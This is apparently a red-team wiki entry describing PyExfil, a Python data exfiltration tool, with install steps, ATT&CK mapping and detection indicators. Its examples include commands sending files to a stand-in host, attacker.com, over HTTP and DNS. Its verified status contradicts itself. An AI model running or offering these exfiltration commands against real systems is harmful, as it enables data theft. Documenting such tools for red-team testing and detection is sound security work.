---
id: d2cab08a-1be2-4e16-9589-856445d13b81
type: tool
verified: true
created_at: '2019-08-28T21:17:19.083936+00:00'
updated_at: '2023-10-01T00:00:00+00:00'
platforms:
  - Linux
  - Windows
  - macOS
tags:
  - exfiltration
  - post-exploitation
  - redteam
  - python
url: 'https://github.com/helpsystems/pyexfil'
validated: true
---

# PyExfil

**Status**: Unverified

## Overview

PyExfil is a Python-based tool for data exfiltration, allowing testers to simulate the theft of sensitive information over various protocols such as HTTP, DNS, SMTP, and more. It's particularly useful in red team engagements for demonstrating exfiltration techniques in environments where direct outbound connections are restricted.

## Description

PyExfil provides modular exfiltration methods that encode and transmit data stealthily. It supports common channels like web services, DNS tunneling, and email, making it versatile for post-exploitation scenarios. The tool is lightweight, requiring only Python, and can be run from compromised hosts to send data back to an attacker's infrastructure without relying on heavy frameworks like Cobalt Strike.

## Features

- **Modular Protocols**: Exfiltrate via HTTP/HTTPS, DNS, SMTP, ICMP, and others.
- **Encoding Support**: Base64, hex, and custom encoding to evade basic filters.
- **File and String Input**: Handle files, stdin, or direct strings for flexibility.
- **Stealth Options**: Chunked transfers and protocol-specific obfuscation.
- **Cross-Platform**: Works on Linux, Windows, and macOS with Python 2/3.

## Installation

### Requirements

- Python 3.6+ (or Python 2.7 for legacy support)
- pip package manager

### Install Commands

```bash
# Install via pip
pip install pyexfil

# Or clone from GitHub
git clone https://github.com/helpsystems/pyexfil.git
cd pyexfil
pip install .
```

On Kali Linux, it may be available via apt, but building from source is recommended for the latest features.

## Basic Usage

```bash
python -m pyexfil --help
```

This displays all available modules and options.

### Common Options

| Option | Description |
|--------|-------------|
| -h, --help | Show help message |
| -v, --verbose | Enable verbose logging |
| --encode | Specify encoding method (base64, hex) |

## Examples

### Example 1: Basic Usage

Exfiltrate a file over HTTP:

```bash
python -m pyexfil.http -f /tmp/secrets.txt -u http://attacker.com/exfil
```

### Example 2: Advanced Usage

DNS exfiltration with custom domain:

```bash
python -m pyexfil.dns -f /tmp/data.bin -d attacker.com --encode base64
```

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Exfiltration Over Command and Control Channel]] Exfiltration Over C2 Channel
- [[Exfiltration to Cloud Storage]] Exfiltration Over Web Service
- [[Protocol Tunneling]] Protocol Tunneling

### Tactics

- [[Exfiltration]] Exfiltration
- [[Execution]] Execution

## Detection

Indicators and methods for detecting this tool's usage:

- Unusual outbound DNS queries with long subdomains.
- HTTP POSTs to non-standard endpoints with encoded payloads.
- SMTP traffic from unexpected sources.
- Python processes with network activity (monitor via Sysmon or process logs).
- Network flows showing data volume spikes over common ports (80, 443, 53).

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Impacket]]
- [[PowerShell Empire]]

## References

- Official GitHub: https://github.com/helpsystems/pyexfil
- PyExfil Documentation: Included in the repo README
- Related Blog: HelpSystems Security Blog on Exfiltration Techniques
